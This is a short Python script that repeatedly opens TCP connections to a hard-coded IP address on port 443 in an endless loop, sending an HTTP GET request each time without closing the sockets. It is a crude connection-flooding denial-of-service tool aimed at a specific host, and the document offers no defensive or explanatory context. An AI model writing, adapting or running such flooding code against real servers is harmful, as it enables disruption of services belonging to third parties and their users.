import socket

target_ip = "45.33.15.206"
target_port = 443

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
    sock.send(message.encode())
